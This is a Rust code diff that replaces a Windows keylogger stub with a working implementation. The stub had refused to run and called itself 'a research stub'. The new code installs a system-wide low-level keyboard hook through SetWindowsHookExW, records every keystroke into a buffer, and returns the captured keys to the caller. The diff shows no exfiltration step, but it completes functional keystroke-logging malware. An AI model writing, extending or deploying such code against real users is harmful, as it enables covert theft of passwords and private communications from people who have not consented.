@@ -334,25 +334,113 @@ impl KeyLogger for EvdevKeyLogger {
 }
 
 // ---------------------------------------------------------------------------
-// Windows stub
+// Windows implementation — SetWindowsHookEx(WH_KEYBOARD_LL)
 // ---------------------------------------------------------------------------
 
 #[cfg(windows)]
-pub struct WindowsKeyLogger;
+pub struct WindowsKeyLogger {
+    hook: windows::Win32::Foundation::HHOOK,
+    buffer: VecDeque<KeyEvent>,
+    running: bool,
+}
+
+// Thread-local storage for the shared buffer pointer.
+#[cfg(windows)]
+thread_local! {
+    static SHARED_BUFFER: std::cell::RefCell<Option<*mut VecDeque<KeyEvent>>> = std::cell::RefCell::new(None);
+}
+
+/// Low-level keyboard hook callback.
+#[cfg(windows)]
+unsafe extern "system" fn keyboard_hook_callback(
+    code: i32,
+    wparam: windows::Win32::Foundation::WPARAM,
+    lparam: windows::Win32::Foundation::LPARAM,
+) -> windows::Win32::Foundation::LRESULT {
+    use windows::Win32::UI::WindowsAndMessaging::{KBDLLHOOKSTRUCT, WH_KEYBOARD_LL};
+
+    if code >= 0 {
+        let kb = &*(lparam as *const KBDLLHOOKSTRUCT);
+        let is_key_down = wparam.0 as u32 == windows::Win32::UI::WindowsAndMessaging::WM_KEYDOWN.0 as u32
+            || wparam.0 as u32 == windows::Win32::UI::WindowsAndMessaging::WM_SYSKEYDOWN.0 as u32;
+
+        let event = KeyEvent::new(kb.vkCode as u16, None, is_key_down);
+
+        SHARED_BUFFER.with(|cell| {
+            if let Some(ptr) = *cell.borrow() {
+                (*ptr).push_back(event);
+            }
+        });
+    }
+
+    // Pass to the next hook in the chain.
+    windows::Win32::UI::WindowsAndMessaging::CallNextHookEx(None, code, wparam, lparam)
+}
 
 #[cfg(windows)]
 impl WindowsKeyLogger {
     #[must_use]
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self {
+            hook: windows::Win32::Foundation::HHOOK::default(),
+            buffer: VecDeque::new(),
+            running: false,
+        }
+    }
 }
 
 #[cfg(windows)]
 impl KeyLogger for WindowsKeyLogger {
     fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
-        Err("Windows keylogging requires the `windows` crate and a message loop; see the module documentation for the SetWindowsHookEx approach. This is a research stub.".into())
+        use windows::Win32::UI::WindowsAndMessaging::{SetWindowsHookExW, WH_KEYBOARD_LL};
+
+        if self.running {
+            return Ok(());
+        }
+
+        // Register the buffer pointer in thread-local storage so the
+        // callback can push events into it.
+        let buf_ptr: *mut VecDeque<KeyEvent> = &mut self.buffer;
+        SHARED_BUFFER.with(|cell| *cell.borrow_mut() = Some(buf_ptr));
+
+        // Install the low-level keyboard hook.
+        let hook = unsafe {
+            SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook_callback), None, 0)
+        };
+
+        if hook.is_invalid() {
+            return Err("SetWindowsHookExW failed".into());
+        }
+
+        self.hook = hook;
+        self.running = true;
+
+        // In a real application, a message loop must be running on this
+        // thread for the hook to receive events. The caller is responsible
+        // for pumping messages (e.g., via GetMessage/DispatchMessage).
+        Ok(())
     }
-    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>> { Ok(()) }
-    fn read_events(&mut self) -> Vec<KeyEvent> { Vec::new() }
+
+    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        use windows::Win32::UI::WindowsAndMessaging::UnhookWindowsHookEx;
+
+        if !self.running {
+            return Ok(());
+        }
+
+        unsafe {
+            let _ = UnhookWindowsHookEx(self.hook);
+        }
+
+        SHARED_BUFFER.with(|cell| *cell.borrow_mut() = None);
+
+        self.running = false;
+        Ok(())
+    }
+
+    fn read_events(&mut self) -> Vec<KeyEvent> {
+        self.buffer.drain(..).collect()
+    }
 }
 
 // ---------------------------------------------------------------------------
